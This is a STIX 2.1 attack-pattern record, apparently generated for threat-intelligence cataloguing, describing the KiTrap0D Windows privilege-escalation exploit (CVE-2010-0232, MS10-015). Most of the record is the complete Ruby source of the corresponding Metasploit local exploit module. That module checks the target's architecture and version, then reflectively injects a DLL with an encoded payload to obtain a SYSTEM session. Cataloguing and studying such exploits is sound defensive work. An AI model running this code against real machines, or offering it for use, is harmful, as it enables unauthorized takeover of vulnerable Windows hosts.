{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81c870cf-c227-46cb-b744-e7dd14e83ad2",
    "created": "2024-08-14T16:49:41.708138Z",
    "modified": "2024-08-14T16:49:41.708141Z",
    "name": "Windows SYSTEM Escalation via KiTrap0D",
    "description": " This module will create a new session with SYSTEM privileges via the KiTrap0D exploit by Tavis Ormandy. If the session in use is already elevated then the exploit will not run. The module relies on kitrap0d.x86.dll and is not supported on x64 editions of Windows.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms10_015_kitrap0d.rb",
            "external_id": "ms10_015_kitrap0d.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0232"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Jan/341"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows SYSTEM Escalation via KiTrap0D',\n        'Description' => %q{\n          This module will create a new session with SYSTEM privileges via the\n          KiTrap0D exploit by Tavis Ormandy. If the session in use is already\n          elevated then the exploit will not run. The module relies on kitrap0d.x86.dll,\n          and is not supported on x64 editions of Windows.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Tavis Ormandy', # Original resesarcher and exploit creator\n          'HD Moore',      # Port of Tavis' code to meterpreter module\n          'Pusscat',       # Port of Tavis' code to meterpreter module\n          'OJ Reeves'      # Port of meterpreter code to a windows local exploit\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows 2K SP4 - Windows 7 (x86)', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'CVE', '2010-0232' ],\n          [ 'OSVDB', '61854' ],\n          [ 'MSB', 'MS10-015' ],\n          [ 'EDB', '11199' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2010/Jan/341' ]\n        ],\n        'DisclosureDate' => '2010-01-19'\n      )\n    )\n  end\n\n  def check\n    # Validate platform architecture\n    if sysinfo['Architecture'] == ARCH_X64\n      return Exploit::CheckCode::Safe\n    end\n\n    # Validate OS version\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Win2000, Msf::WindowsVersion::Win7_SP1)\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    print_status('Reflectively injecting payload and triggering the bug...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2010-0232', 'kitrap0d.x86.dll'),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-19",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}